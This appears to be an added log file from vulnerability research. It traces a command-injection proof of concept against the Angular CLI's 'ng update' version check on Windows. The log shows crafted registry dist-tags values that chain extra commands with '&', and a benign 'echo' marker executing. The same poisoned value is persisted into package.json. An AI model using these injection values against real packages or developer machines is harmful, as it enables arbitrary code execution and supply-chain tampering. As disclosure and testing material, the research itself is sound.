@@ -1,0 +1,25 @@
+=== N1-G: W1 version-check venue (cli-version.ts:63, runs on EVERY ng update) ===
+
+[1] getCLIUpdateRunnerVersion -> next="next" nonAngular="0" (tag NAMES / numbers, NOT validated)
+
+[2] checkCLIVersion: pm.getManifest("@angular/cli@next") — the fetch BEFORE the manifest.version comparison
+[HOST] win32 shell:string -> "yarn info --json --verbose @angular/cli"
+[HOST stdout] {"type":"inspect","data":{"name":"@angular/cli","dist-tags":{"latest":"1.0.0\" & calc & \"","next":"1.0.0\" & echo N1G-PWNED & \""},"versions":{"1.0.0":{"name":
+[HOST] win32 shell:string -> "yarn info --json --verbose \"@angular/cli@1.0.0\" & echo N1G-PWNED & \"\""
+[HOST stderr] /bin/sh: : command not found
+[HOST stdout] N1G-PWNED
+{"type":"inspect","data":{"name":"@angular/cli","version":"22.0.0","dist-tags":{}},"content_type":"text/json"}
+[3] post-fetch compare: installed=0.0.0-PLACEHOLDER manifest.version=22.0.0 -> cliVersionToInstall=next
+[4] runTempBinary path: acquireTempPackage("@angular/cli@next") -> spawns the temp CLI binary (spawnSync, non-shell) — the FETCH inside it repeats this venue
+
+[5] package.json poisoning: applyUpdatePlan writes the UNVALIDATED dist-tags value into package.json dependencies
+[logger.info] Updating package.json with dependency @angular/cli to version 1.0.0" & echo N1G-PWNED & "...
+[5] written package.json dependencies["@angular/cli"] = "^1.0.0\" & echo N1G-PWNED & \""
+[5] POISONING-WRITE: CONFIRMED — the unvalidated value is persisted into the dev package.json
+
+[6] exact cmd.exe string for the version-check venue (malicious dist-tags "next"):
+    yarn info --json --verbose "@angular/cli@1.0.0" & calc & ""
+    -> executes yarn, then calc, then an empty command (cmd.exe shell:true semantics).
+    The live run above used "echo N1G-PWNED" in place of calc to demonstrate the `&` chaining executes a second command:
+
+=== VERDICT: version-check venue DEMONSTRATED = y (marker fired 6 times: cmd-exec chain + package.json write) ===
